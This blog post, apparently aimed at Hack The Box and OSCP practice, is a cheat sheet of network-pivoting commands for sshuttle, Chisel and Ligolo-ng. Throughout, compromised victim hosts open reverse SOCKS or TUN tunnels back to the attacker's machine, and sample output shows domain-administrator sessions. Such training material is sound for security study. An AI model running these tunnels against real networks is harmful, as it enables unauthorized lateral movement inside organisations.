---
layout: post
title:  "Pivoting - Cheat Sheet"
author: nanobyte
date:   2023-06-27
description: Pivoting Cheat Sheet
tags: HTB OSCP Pivoting
---

[Part 1](https://nanobytesecurity.com/2023/06/26/pivoting-basics-part1.html), pivoting introduction and using SSHuttle\
[Part 2](https://nanobytesecurity.com/2023/06/26/chisel-pivoting-part2.html), pivoting with Chisel\
[Part 3](https://nanobytesecurity.com/2023/06/26/ligolo-pivoting-part3.html), pivoting with Ligolo-ng
[Pivoting Cheat Sheet](https://nanobytesecurity.com/2023/06/27/pivoting-cheatsheet.html), pivoting cheat sheet

<h3>SSHuttle</h3>

{% highlight bash linenos %}
sshuttle -r root@<victim> <distant network> -x <victim eth2> --ssh-cmd 'ssh -i id_rsa.key'
{% endhighlight %}

Chisel

{% highlight bash linenos %}
Make sure to use the same versions, on target and host machines!
# Attacking Box:
./chisel server -p 80 --reverse

# Victim Box (IP is to our Kali Machine):
./chisel.exe client 10.10.14.18:80 R:socks
{% endhighlight %}

Place this into /etc/proxychains4.conf:

{% highlight bash linenos %}
socks5 127.0.0.1 1080
{% endhighlight %}

<h4>Triple Pivoting (Oh My!)</h4>h4>

On Kali:


{% highlight bash linenos %}
./chisel server -p 80 --reverse
{% endhighlight %}

First pivot box:


{% highlight bash linenos %}
./chisel client 10.10.14.228:80 R:1080:socks
{% endhighlight %}

Second pivot box:


{% highlight bash linenos %}
./chisel client 10.10.14.228:80 R:2080:socks
{% endhighlight %}

Third pivot box:


{% highlight bash linenos %}
./chisel client 10.10.14.228:80 R:3080:socks
{% endhighlight %}

Change /etc.proxychains4.conf:


{% highlight bash linenos %}
# Change to Dynamic Chain:
#strict_chain
dynamic_chain

# Add our chisel proxies
socks5 127.0.0.1 3080
socks5 127.0.0.1 2080
socks5 127.0.0.1 1080
{% endhighlight %}

<h3>Ligolo-ng</h3>

To setup ligolo-ng, on Kali:

{% highlight bash linenos %}
# This will create a new TUN interface
sudo ip tuntap add user [your_username] mode tun ligolo

# This will set the link on yhe nee interface to up
sudo ip link set ligolo up

# This will add a route to the new tunnel.
# NOTE this is where you insert the new subnet you want to access.
sudo ip route add 172.16.5.0/24 dev ligolo
{% endhighlight %}

Once added, we can run the proxy on Kali:

{% highlight bash linenos %}
./proxy -selfcert
{% endhighlight %}

Then, from the Pivot machine, we can run the agent command:

{% highlight bash linenos %}
./agent -connect 10.10.14.10:11601 -ignore-cert
{% endhighlight %}

On our Proxy on Kali, we should see a connection back:

{% highlight bash linenos %}
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

Made in France ♥ by @Nicocha30!

ligolo-ng » INFO[0024] Agent joined. name="DOMAIN\\Administrator@DC01" remote="10.10.110.3:49821"
We can then run the session and start commands:
ligolo-ng » session
? Specify a session : 1 - DOMAIN\Administrator@DC01 - 10.10.110.3:49821

[Agent : DOMAIN\Administrator@DC01] » start
[Agent : DOMAIN\Administrator@DC01] » INFO[0359] Starting tunnel to CORP\Administrator@DC01
{% endhighlight %}

<h4>Double Pivoting</h4>

Once we have multiple agents, we can quickly change the interaction between which one to use:

{% highlight bash linenos %}
[Agent : DEV\Administrator@DC02] » session
? Specify a session :  [Use arrows to move, type to filter]
> 6 - DOMAIN\Administrator@DC01 - 10.10.110.3:18115
  7 - DOMAIN\Administrator@DC02 - 10.10.110.3:33051
{% endhighlight %}
